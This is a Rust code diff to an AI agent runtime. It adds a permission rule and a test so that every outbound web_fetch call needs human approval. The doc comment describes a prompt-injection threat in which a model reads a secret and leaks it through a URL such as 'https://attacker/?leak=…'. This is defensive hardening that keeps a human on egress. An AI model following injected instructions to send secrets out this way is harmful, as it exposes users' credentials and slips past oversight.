@@ -79,6 +79,16 @@ const DANGEROUS_BASH: &[&str] = &[
     "bash:*|bash*",
 ];
 
+/// Tool families that must always PROMPT (never silent), even though the
+/// agent owns its workspace. `web_fetch` is the runtime's ONLY outbound-
+/// network capability and the URL is model-controlled — a prompt-injected
+/// model could read a secret then `web_fetch("https://attacker/?leak=…")`.
+/// Seeding it to Ask keeps a human-in-the-loop on egress; operators add
+/// per-host `always_allow` rules for trusted hosts. This is NOT in `ALLOW`
+/// (which would auto-approve like `read:**`/`edit:**`) precisely because
+/// the URL is the exfil channel.
+const ASK: &[&str] = &["web_fetch:**"];
+
 /// Build the boot-time permission seed. Returns the layered rule list
 /// (allow families first, dangerous-bash overrides last).
 ///
@@ -103,7 +113,11 @@ pub fn default_permission_rules() -> Vec<PermissionRule> {
         permission: (*p).to_string(),
         action: PermissionAction::Ask,
     });
-    allow.chain(dangerous).collect()
+    let ask = ASK.iter().map(|p| PermissionRule {
+        permission: (*p).to_string(),
+        action: PermissionAction::Ask,
+    });
+    allow.chain(dangerous).chain(ask).collect()
 }
 
 #[cfg(test)]
@@ -226,5 +240,21 @@ mod tests {
                 );
             }
         }
+    }
+
+    #[tokio::test]
+    async fn web_fetch_prompts_never_silent() {
+        // Egress is the only outbound-network capability and the URL is the
+        // exfil channel — it must ALWAYS prompt (never auto-allow like the
+        // file families), so a prompt-injected model cannot silently leak.
+        let m = seeded().await;
+        let d = m
+            .check(ctx(), req("web_fetch:https://example.com/x"))
+            .await
+            .unwrap();
+        assert!(
+            matches!(d, Decision::Pending { .. }),
+            "expected web_fetch to prompt, got {d:?}"
+        );
     }
 }
